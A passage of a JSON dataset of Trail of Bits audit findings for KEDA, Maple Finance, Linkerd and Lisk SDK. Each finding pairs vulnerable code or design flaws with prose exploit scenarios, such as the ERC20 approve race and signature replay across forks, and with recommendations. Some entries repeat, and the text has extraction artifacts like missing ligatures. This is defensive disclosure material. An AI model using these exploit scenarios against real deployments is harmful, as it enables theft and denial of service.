        "body": "Within a function in the scaler for Azure event hubs, the object partitionInfo is dereferenced before correctly checking it against nil . Before the object is used, a check conrms that partitionInfo is not nil . However, this check is insucient because the function returns if the condition is met, and the function subsequently uses partitionInfo without additional checks against nil . As a result, a panic may occur when partitionInfo is later used in the same function. func (s *azureEventHubScaler) GetUnprocessedEventCountInPartition(ctx context.Context, partitionInfo *eventhub.HubPartitionRuntimeInformation) (newEventCount int64 , checkpoint azure.Checkpoint, err error ) { // if partitionInfo.LastEnqueuedOffset = -1, that means event hub partition is empty if partitionInfo != nil && partitionInfo.LastEnqueuedOffset == \"-1\" { return 0 , azure.Checkpoint{}, nil } checkpoint, err = azure.GetCheckpointFromBlobStorage(ctx, s.httpClient, s.metadata.eventHubInfo, partitionInfo.PartitionID ) Figure 7.1: partionInfo is dereferenced before a nil check pkg/scalers/azure_eventhub_scaler.go#L253-L259 Exploit Scenario While the Azure event hub performs its usual applications, an application error causes GetUnprocessedEventCountInPartition to be called with a nil partitionInfo parameter. This causes a panic and the scaler to crash and to stop monitoring events. Recommendations Short term, edit the code so that partitionInfo is checked against nil before dereferencing it. Long term, use CodeQL and its go/missing-error-check query to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Prometheus metrics server does not support authentication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "body": "When scraping metrics, Prometheus supports multiple forms of authentication , including Basic authentication, Bearer authentication, and OAuth 2.0. KEDA exposes Prometheus metrics but does not oer the ability to protect its metrics server with any of the supported authentication types. Exploit Scenario A user deploys KEDA on a network. An adversary gains access to the network and is able to issue HTTP requests to KEDAs Prometheus metrics server. As KEDA does not support authentication for the server, the attacker can trivially view the exposed metrics. Recommendations Short term, implement one or more of the authentication types that Prometheus supports for scrape targets. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Risk of reuse of signatures across forks due to lack of chain ID validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf",
        "body": "The ERC20Permit contract implements EIP-2612 functionality, in which a domain separator containing the chain ID is included in the signature schema. However, the chain ID is xed at the time of deployment. In the event of a post-deployment hard fork of the chain, the chain ID cannot be updated, and signatures may be replayed across both versions of the chain. If a change in the chain ID is detected, the domain separator can be cached and regenerated. Exploit Scenario Bob holds tokens worth $1,000 on the mainnet. Bob submits a signature to permit Eve to spend those tokens on his behalf. Later, the mainnet is hard-forked and retains the same chain ID. As a result, there are two parallel chains with the same chain ID, and Eve can use Bobs signature to transfer funds on both chains. Recommendations Short term, to prevent post-deployment forks from aecting calls to permit, add code to permit that checks block.chainId against chainId and recomputes the DOMAIN_SEPARATOR if they are dierent. Long term, identify and document the risks associated with having forks of multiple chains and develop related mitigation strategies. 18 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Risk of token theft due to race condition in ERC20s approve function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf",
        "body": "A known race condition in the ERC20 standards approve function could lead to token theft. The ERC20 standard describes how to create generic token contracts. Among others, an ERC20 contract denes these two functions:  transferFrom(from, to, value)  approve(spender, value) These functions can be called to give permission to a third party to spend tokens. When a user calls the approve(spender, value) function, the spender can spend up to the value of the callers tokens by calling transferFrom(user, to, value). This schema is vulnerable to a race condition in which the user calls approve a second time on a spender that has already been approved. Before the second transaction is mined, the spender can call transferFrom to transfer the previously approved value and still receive the authorization to transfer the new approved value. Exploit Scenario Alice calls approve(Bob, 1000), allowing Bob to spend 1,000 tokens. Alice changes her mind and calls approve(Bob, 500). Once mined, this transaction will decrease the number of tokens that Bob can spend to 500. Bob sees the second transactionapprove(Bob, 500)and calls transferFrom(Alice, X, 1000) before it is mined. Bobs transaction is mined before Alices, and Bob transfers 1,000 tokens. Once Alices transaction is mined, Bob calls transferFrom(Alice, X, 500). Essentially, Bob is able to transfer 1,500 tokens even though Alice intended that he be able to transfer only 500. Recommendations Short term, add two non-ERC20 functions allowing users to increase and decrease the approval (increaseAllowance, decreaseAllowance). 19 Maple Labs Long term, when implementing custom ERC20 contracts, use slither-check-erc to check that the contracts adhere to the specication and are protected against this issue. 20 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing check on newAssets decimals ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf",
        "body": "The Migrator contract allows users to migrate their MPL tokens to a new version of the token; however, it lacks a check to ensure that newAsset's decimals are equal to the old asset's decimals. A migration functionality is implemented in the xMPL contract, allowing users who deposited their MPL tokens to easily migrate them to the new version. constructor(address oldToken_, address newToken_) { oldToken = oldToken_; newToken = newToken_; } Figure 3.1: Migrator.sol#L11-L14 Exploit Scenario Bob, the owner of xMPL, calls performMigration to migrate the underlying asset to the new version, which has dierent decimals. Alice, a Maple user, decides to redeem her shares after the migration, and she receives an incorrect amount due to the dierent decimals on the new asset. Recommendations Short term, in the Migrator contract's constructor, add a check to verify that newAsset's decimals are equal to the old asset's decimals. Long term, when implementing a migration of a component, make sure that checks are in place to verify the correctness of all data related to the migrated component. 21 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Lack of zero address checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf",
        "body": "A number of functions in the codebase do not revert if the zero address is passed in for a parameter that should not be set to zero. The following parameters do not have zero address checks:  The owner_ and spender_ parameters of the _approve function  The owner_ and recipient_ parameters of the _transfer function  The recipient_ parameter of the _mint function  The owner_ parameter of the _burn function Exploit Scenario Alice, a user of the xMPL contract, tries to send 100 xMPL tokens; however, she does not set the recipient, and her wallet incorrectly validates it as the zero address. She loses her tokens. Recommendations Short term, add zero address checks for the parameters listed above and for all other parameters for which zero is not an acceptable value. Long term, comprehensively validate all parameters. Avoid relying solely on the validation performed by front-end code, scripts, or other contracts, as a bug in any of those components could prevent them from performing that validation. 22 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Possibility that users could receive more assets than the amount due ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf",
        "body": "If totalSupply is zero (i.e., no one has deposited yet), the rst user who deposits after updateVestingSchedule is called could immediately redeem his tokens to get back more of the asset than the amount he deposited. This is possible because, by design, when totalSupply is zero, the number of shares minted corresponds to the number of assets deposited. function convertToShares(uint256 assets_) public view override returns (uint256 shares_) { uint256 supply = totalSupply; // Cache to memory. shares_ = supply == 0 ? assets_ : (assets_ * supply) / totalAssets(); } Figure 5.1: RevenueDistributionToken.sol#L190-L195 Exploit Scenario Bob, the owner of the xMPL contract, decides to deposit rewards. He calls updateVestingSchedule without noticing that there are not yet any depositors. Eve deposits tokens and redeems them in the same transaction, receiving an unfair number of assets (appendix E). Recommendations Short term, make sure there is at least one depositor before calling updateVestingSchedule. Long term, document assumptions about possible edge cases that can occur when operating the protocol. 23 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Signature malleability due to use of ecrecover ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf",
        "body": "The ERC20Permit contract implements EIP-2612 functionality, which requires the use of the precompiled EVM contract ecrecover. This contract is susceptible to signature malleability due to non-unique s and v values, which could allow users to conduct replay attacks. However, the current implementation is protected from possible replay attacks due to its use of nonces. function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external override { require(deadline >= block.timestamp, \"ERC20Permit:EXPIRED\"); bytes32 digest = keccak256( abi.encodePacked( \"\\x19\\x01\", DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, amount, nonces[owner]++, deadline)) ) ); address recoveredAddress = ecrecover(digest, v, r, s); require(recoveredAddress == owner && owner != address(0), \"ERC20Permit:INVALID_SIGNATURE\"); _approve(owner, spender, amount); } Figure 6.1: ERC20Permit.sol#L72-L84 Recommendations Short term, to prevent the future misuse of ecrecover, implement appropriate checks on the s and v values to verify that s is in the lower half of the range and v is 27 or 28. Long term, identify and document the risks associated with the use of ecrecover and Maple Labss plans to mitigate them. 24 Maple Labs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf",
        "body": "The Maple contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Maple contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 25 Maple Labs A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Lack of rate-limiting mechanisms in the identity service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "The identity service issues signed certicates to sidecar proxies within Linkerd-integrated infrastructure. When proxies initialize for the rst time, they request a certicate from the identity service. However, the identity service lacks sucient rate-limiting mechanisms, which may make it prone to denial-of-service attacks. Because identity controllers are shared among pods in a cluster, a denial of service of an identity controller may aect the availability of applications across the cluster. Threat Scenario An attacker obtains access to the sidecar proxy in one of the user application namespaces. Due to the lack of rate-limiting mechanisms within the identity service, the proxy can now repeatedly request a newly signed certicate as if it were a proxy sidecar initializing for the rst time. Recommendations Short term, add rate-limiting mechanisms to the identity service to prevent a single pod from requesting too many certicates or performing other computationally intensive actions. Long term, ensure that appropriate rate-limiting mechanisms exist throughout the infrastructure to prevent denial-of-service attacks. Where possible, implement stricter access controls to ensure that components cannot interact with APIs more than necessary. Additionally, ensure that the system suciently logs events so that an audit trail is available in the event of an attack. 33 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Lack of rate-limiting mechanisms in the destination service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "The destination service contains trac-routing information for sidecar proxies within Linkerd-integrated infrastructure. However, the destination service lacks sucient rate-limiting mechanisms, which may make it prone to denial-of-service attacks if a pod repeatedly changes its availability status. Because destination controllers are shared among pods in a cluster, a denial of service of a destination controller may aect the availability of applications across the cluster. Threat Scenario An attacker obtains access to the sidecar proxy in one of the user application namespaces. Due to the lack of rate-limiting mechanisms within the destination service, the proxy can now repeatedly request routing information or change its availability status to force updates in the controller. Recommendations Short term, add rate-limiting mechanisms to the destination service to prevent a single pod from requesting too much routing information or performing state updates too quickly. Long term, ensure that appropriate rate-limiting mechanisms exist throughout the infrastructure to prevent denial-of-service attacks. Where possible, implement stricter access controls to ensure that components cannot interact with APIs more than necessary. Additionally, ensure that the system suciently logs events so that an audit trail is available in the event of an attack. 34 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. CLI tool allows the use of insecure protocols when externally sourcing infrastructure denitions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "When using the command-line interface (CLI) tool, an operator may source infrastructural YAML denitions from a URI path specifying any protocol, such as http:// or https://. Therefore, a user could expose sensitive information when using an insecure protocol such as HTTP. Furthermore, the Linkerd documentation does not warn users about the systems use of insecure protocols. Threat Scenario An infrastructure operator integrates Linkerd into her infrastructure. When doing so, she uses the CLI tool to fetch YAML denitions over HTTP. Unbeknownst to her, the use of HTTP has made her data visible to attackers on the local network. Her data is also prone to man-in-the-middle attacks. Recommendations Short term, disallow the use of insecure protocols within the CLI tool when sourcing external data. Alternatively, provide documentation and best practices regarding the use of insecure protocols when externally sourcing data within the CLI tool. 35 Linkerd Threat Model 4. Exposure of admin endpoint may a\u0000ect application availability Severity: Medium Diculty: Medium Type: Awareness and Training Finding ID: TOB-LKDTM-4 Target: linkerd-proxy",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Gos pprof endpoints enabled by default in all admin servers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "All core components of the Linkerd infrastructure, in both the data and control planes, have an admin server with Gos server runtime proler (pprof) endpoints on /debug/pprof enabled by default. These servers are not exposed to the rest of the cluster or to the local network by default. Threat Scenario An attacker scans the network in which a Linkerd cluster is congured and discovers that an operator forwarded the admin server port to the local network, exposing the pprof endpoints to the local network. He connects a proler to it and gains access to debug information, which assists him in mounting further attacks. Recommendations Short term, add a check to http.go that enables pprof endpoints only when Linkerd runs in debug or test mode. Long term, audit all debug-related functionality to ensure it is not exposed when Linkerd is running in production mode. References  Your pprof is showing: IPv4 scans reveal exposed net/http/pprof endpoints 37 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Lack of access controls on the linkerd-viz dashboard ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "Linkerd operators can enable a set of metrics-focused features by adding the linkerd-viz extension. Doing so enables a web UI dashboard that lists detailed information about the namespaces, services, pods, containers, and other resources in a Kubernetes cluster in which Linkerd is congured. Operators can enable Kubernetes role-based access controls to the dashboard; however, no access control options are provided by Linkerd. Threat Scenario An attacker scans the network in which a Linkerd cluster is congured and discovers an exposed UI dashboard. By accessing the dashboard, she gains valuable insight into the cluster. She uses the knowledge gained from exploring the dashboard to formulate attacks that would expand her access to the network. Recommendations Short term, document recommendations for restructuring access to the linkerd-viz dashboard. Long term, add authentication and authorization controls for accessing the dashboard. This could be done by implementing tokens created via the CLI or client-side authorization logic. 38 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Prometheus endpoints reachable from the user application namespace ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "The linkerd-viz extension provides a Prometheus API that collects metrics data from the various proxies and controllers used by the control and data planes. Metrics can include various labels with IP addresses, pod IDs, and port numbers. Threat Scenario An attacker gains access to a user application pod and calls the API directly to read Prometheus metrics. He uses the API to gain information about the cluster that aids him in expanding his access across the Kubernetes infrastructure. Recommendations Short term, disallow access to the Prometheus extension from the user application namespace. This could be done in the same manner in which access to the web dashboard is restricted from within the cluster (e.g., by allowing access only for specic hosts). 39 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Lack of egress access controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "Linkerd provides access control mechanisms for ingress trac but not for egress trac. Egress controls would allow an operator to impose important restrictions, such as which external services and endpoints that a meshed application running in the application namespace can communicate with. Threat Scenario A user application becomes compromised. As a result, the application code begins making outbound requests to malicious endpoints. The lack of access controls on egress trac prevents infrastructure operators from mitigating the situation (e.g., by allowing the application to communicate with only a set of allowlisted external services). Recommendations Short term, add support for enforcing egress network policies. A GitHub issue to implement this recommendation already exists in the Linkerd repository. 40 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Prometheus endpoints are unencrypted and unauthenticated by default ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "The linkerd-viz extension provides a Prometheus API that collects metrics data from the various proxies and controllers used by the control and data planes. However, this endpoint is unencrypted and unauthenticated, lacking access and condentiality controls entirely. Threat Scenario An attacker gains access to a sibling component within the same namespace in which the Prometheus endpoint exists. Due to the lack of access controls, the attacker can now laterally obtain Prometheus metrics with ease. Additionally, due to the lack of condentiality controls, such as those implemented through the use of cryptography, connections are exposed to other parties. Recommendations Short term, consider implementing access controls within Prometheus and Kubernetes to disallow access to the Prometheus metrics endpoint from any machine within the cluster that is irrelevant to Prometheus logging. Additionally, implement secure encryption of connections with the use of TLS within Prometheus or leverage existing Linkerd mTLS schemes. 41 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Shared identity and destination services in a cluster poses risks to multi-application clusters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "The identity and destination controllers are meant to convey certicate and routing information for proxies, respectively. However, only one identity controller and one destination controller are deployed in a cluster, so they are shared among all application pods within a cluster. As a result, a single application pod could pollute records, causing denial-of-service attacks or otherwise compromising these cluster-wide components. Additionally, a compromise of these cluster-wide components may result in the exposure of routing information for each application pod. Although the Kubernetes API server is exposed with the same architecture, it may be benecial to minimize the attack surface area and the data that can be exltrated from compromised Linkerd components. Threat Scenario An attacker gains access to a single user application pod and begins to launch attacks against the identity and destination services. As a result, these services cannot serve other user application pods. The attacker later nds a way to compromise one of these two services, allowing her to leak sensitive application trac from other user application pods. Recommendations Short term, implement per-pod identity and destination services that are isolated from other pods. If this is not viable, consider documenting this caveat so that users are aware of the risks of hosting multiple applications within a single cluster. 42 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Lack of isolation between components and their sidecar proxies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "Within the Linkerd, linkerd-viz, and user application namespaces, each core component lives alongside a linkerd-proxy container, which proxies the components trac and provides mTLS for internal connections. However, because the sidecar proxies are not isolated from their corresponding components, the compromise of a component would mean the compromise of its proxy, and vice versa. This is particularly interesting when considering the lack of access controls for some components, as detailed in TOB-LKDTM-4: proxy admin endpoints are exposed to the applications they are proxying, allowing metrics collection and shutdown requests to be made. Threat Scenario An attacker exploits a vulnerability to gain access to a linkerd-proxy instance. As a result, the attacker is able to compromise the condentiality, integrity, and availability of lateral components, such as user applications, identity and destination services within the Linkerd namespace, and extensions within the linkerd-proxy namespace. Recommendations Short term, document system caveats and sensitivities so that operators are aware of them and can better defend themselves against attacks. Consider employing health checks that verify the integrity of proxies and other components to ensure that they have not been compromised. Long term, investigate ways to isolate sidecar proxies from the components they are proxying (e.g., by setting stricter access controls or leveraging isolated namespaces between proxied components and their sidecars). 43 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Lack of centralized security best practices documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "While security recommendations are included throughout Linkerds technical guidance documents, there is no centralized guidance on security best practices. Furthermore, the documentation on securing clusters lacks guidance on security best practices such as conguring timeouts and retries, authorization policy recommendations for defense in depth, and locking down access to linkerd-viz components. Threat Scenario A user is unaware of security best practices and congures Linkerd in an insecure manner. As a result, her Linkerd infrastructure is prone to attacks that could compromise the condentiality, integrity, and availability of data handled by the cluster. Recommendations Short term, develop centralized documentation on security recommendations with a focus on security-in-depth practices for users to follow. This guidance should be easy to locate should any user wish to follow security best practices when using Linkerd. 44 Linkerd Threat Model 13. Unclear distinction between Linkerd and Linkerd2 in o\u0000cial Linkerd blog post guidance Severity: Informational Diculty: Informational Type: Awareness and Training Finding ID: TOB-LKDTM-13 Target: Linkerd",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Informational"
        ]
    },
    {
        "title": "3. CLI tool allows the use of insecure protocols when externally sourcing infrastructure denitions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "When using the command-line interface (CLI) tool, an operator may source infrastructural YAML denitions from a URI path specifying any protocol, such as http:// or https://. Therefore, a user could expose sensitive information when using an insecure protocol such as HTTP. Furthermore, the Linkerd documentation does not warn users about the systems use of insecure protocols. Threat Scenario An infrastructure operator integrates Linkerd into her infrastructure. When doing so, she uses the CLI tool to fetch YAML denitions over HTTP. Unbeknownst to her, the use of HTTP has made her data visible to attackers on the local network. Her data is also prone to man-in-the-middle attacks. Recommendations Short term, disallow the use of insecure protocols within the CLI tool when sourcing external data. Alternatively, provide documentation and best practices regarding the use of insecure protocols when externally sourcing data within the CLI tool. 35 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Exposure of admin endpoint may a\u0000ect application availability ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "User application sidecar proxies expose an admin endpoint that can be used for tasks such as shutting down the proxy server and collecting metrics. This endpoint is exposed to other components within the same pod. Therefore, an internal attacker could shut down the proxy, aecting the user applications availability. Furthermore, the admin endpoint lacks access controls, and the documentation does not warn of the risks of exposing the admin endpoint over the internet. Threat Scenario An infrastructure operator integrates Linkerd into his Kubernetes cluster. After a new user application is deployed, an underlying component within the same pod is compromised. An attacker with access to the compromised component can now laterally send a request to the admin endpoint used to shut down the proxy server, resulting in a denial of service of the user application. Recommendations Short term, employ authentication and authorization mechanisms behind the admin endpoint for proxy servers. Long term, document the risks of exposing critical components throughout Linkerd. For instance, it is important to note that exposing the admin endpoint on a user application proxy server may result in the exposure of a shutdown method, which could be leveraged in a denial-of-service attack. 36 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Lack of centralized security best practices documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "While security recommendations are included throughout Linkerds technical guidance documents, there is no centralized guidance on security best practices. Furthermore, the documentation on securing clusters lacks guidance on security best practices such as conguring timeouts and retries, authorization policy recommendations for defense in depth, and locking down access to linkerd-viz components. Threat Scenario A user is unaware of security best practices and congures Linkerd in an insecure manner. As a result, her Linkerd infrastructure is prone to attacks that could compromise the condentiality, integrity, and availability of data handled by the cluster. Recommendations Short term, develop centralized documentation on security recommendations with a focus on security-in-depth practices for users to follow. This guidance should be easy to locate should any user wish to follow security best practices when using Linkerd. 44 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Informational"
        ]
    },
    {
        "title": "13. Unclear distinction between Linkerd and Linkerd2 in o\u0000cial Linkerd blog post guidance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "The ocial Linkerd documentation clearly indicates the version of Linkerd that each document pertains to. For instance, documentation specic to Linkerd 1.x displays a message stating, This is not the latest version of Linkerd! However, guidance documented in blog post form on the same site does not provide such information. For instance, the rst result of a Google search for Linkerd RBAC is a Linkerd blog post with guidance that is applicable only to linkerd 1.x, but there is no indication of this fact on the page. As a result, users who rely on these blog posts may misunderstand functionality in Linkerd versions 2.x and above. Threat Scenario A user searches for guidance on implementing various Linkerd features and nds documentation in blog posts that applies only to Linkerd version 1.x. As a result, he misunderstands Linkerd and its threat model, and he makes conguration mistakes that lead to security issues. Recommendations Short term, on Linkerd blog post pages, add indicators similar to the UI elements used in the Linkerd documentation to clearly indicate which version each guidance page applies to. 45 Linkerd Threat Model",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Informational"
        ]
    },
    {
        "title": "14. Insu\u0000cient logging of outbound HTTPS calls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf",
        "body": "Linkerd operators can use the linkerd-viz extensions such as Prometheus and Grafana to collect metrics for the various proxies in a Linkerd infrastructure. However, these extensions do not collect metrics on outbound calls made by meshed applications. This limits the data that operators could use to conduct incident response procedures if compromised applications reach out to malicious external services and servers. Threat Scenario A meshed application running in the data plane is compromised as a result of a supply chain attack. Because outbound HTTPS calls are not logged, Linkerd operators are unable to collect sucient data to determine the impact of the vulnerability. Recommendations Short term, implement logging for outbound HTTPS connections. A GitHub issue to implement this recommendation already exists in the Linkerd repository but is still unresolved as of this writing. 46 Linkerd Threat Model A. Methodology A threat modeling assessment is intended to provide a detailed analysis of the risks that an application faces at the structural and operational level; the goal is to assess the security of the applications design rather than its implementation details. During these assessments, engineers rely heavily on frequent meetings with the clients developers and on extensive reading of all documentation provided by the client. Code review and dynamic testing are not part of the threat modeling process, although engineers may occasionally consult the codebase or a live instance of the project to verify assumptions about the systems design. Engineers begin a threat modeling assessment by identifying the safeguards and guarantees that are critical to maintaining the target systems condentiality, integrity, and availability. These security controls dictate the assessments overarching scope and are determined by the requirements of the target system, which may relate to technical and reputational concerns, legal liability, and regulatory compliance. With these security controls in mind, engineers then divide the system into logical componentsdiscrete elements that perform specic tasksand establish trust zones around groups of components that lie within a common trust boundary. They identify the types of data handled by the system, enumerating the points at which data is sent, received, or stored by each component, as well as within and across trust boundaries. After establishing a detailed map of the target systems structure and data ows, engineers then identify threat actorsanyone who might threaten the targets security, including both malicious external actors and naive internal actors. Based on each threat actors initial privileges and knowledge, engineers then trace threat actor paths through the system, determining the controls and data that a threat actor might be able to improperly access, as well as the safeguards that prevent such access. Any viable attack path discovered during this process constitutes a nding, which is paired with design recommendations to remediate gaps in the systems defenses. Finally, engineers rate the strength of each security control, indicating the general robustness of that type of defense against the full spectrum of possible attacks. These ratings are provided in the Security Control Maturity Evaluation table. 47 Linkerd Threat Model B. Security Controls and Rating Criteria The following tables describe the security controls and rating criteria used in this report. Security Controls Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Impossible to send cross-chain NFT transfers in certain congurations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The isNFTSupported functiona function called in the CrossChainTransferCommands execute function when receiving NFTs from foreign chains to check if an NFT is supportedmay return incorrect results because the getCollectionID function (gure 1.1) enforces that an NFT must be stored before returning the corresponding collection ID. public async getCollectionID( methodContext: ImmutableMethodContext, nftID: Buffer, ): Promise<Buffer> { const nftStore = this.stores.get(NFTStore); const nftExists = await nftStore.has(methodContext, nftID); if (!nftExists) { throw new Error('NFT substore entry does not exist'); } return nftID.slice(LENGTH_CHAIN_ID, LENGTH_CHAIN_ID + LENGTH_COLLECTION_ID); } Figure 1.1: The getCollectionID function (lisk-sdk/framework/src/modules/nft/method.ts#187197) The isNFTSupported function calls getCollectionID if: a) the NFT ID is not native to the chain, b) the SupportedNFTsStore store does not have the ALL_SUPPORTED_NFTS_KEY key, and c) the supportedCollectionIDArray array for the given chain is not empty (indicating that all collections are supported). Under these conditions, isNFTSupported will always throw an exception and prevent the cross chain transfer. Exploit Scenario A developer congures chain A to support NFTs of collection 1 from chain B. A user from chain B attempts to transfer to chain A an NFT belonging to collection 1 of chain B. The cross-chain message (CCM) fails and the NFT cannot be transferred. 18 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment Recommendations Short term, remove the NFT existence check from the getCollectionID function. This will allow obtaining the collection ID of non-stored NFT IDs, which is necessary in the isNFTSupported function. Long term, create tests that cover this case and all other possible congurations of the SupportedNFTsStore store. 19 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. NFT module has repeated transfer functionality ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-lisksdk-securityreview.pdf",
        "body": "The NFT modules transfer command functions, verify and execute, together have the same checks and function calls as the transfer method. Their dierence is in how they handle errors. Having duplicated code, especially for critical functionality such as transferring NFTs, is bad practice, as the code may diverge and lead to exploitable bugs. The same problem exists on the TransferCrossChainCommand command and transferCrossChain method. Exploit Scenario A developer xes a critical vulnerability in one of the functions with copied functionality, but forgets to x the counterpart. The code remains vulnerable. An attacker nds out and steals NFTs from users. Recommendations Short term, factorize the code into a single function that veries if a transfer is valid. The common function should throw custom exceptions based on the type of error that occurred. In both the transfer command and method, have the code call the single function and handle errors appropriately (e.g., by just letting the exception go through, or by catching it and emitting an event). Long term, review other modules for duplicated functionality, especially in critical code paths such as the code that handles transfers. If the code is duplicated, factorize into a single function. 20 Lisk SDK v6.1 Sapphire, NFT and PoA Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
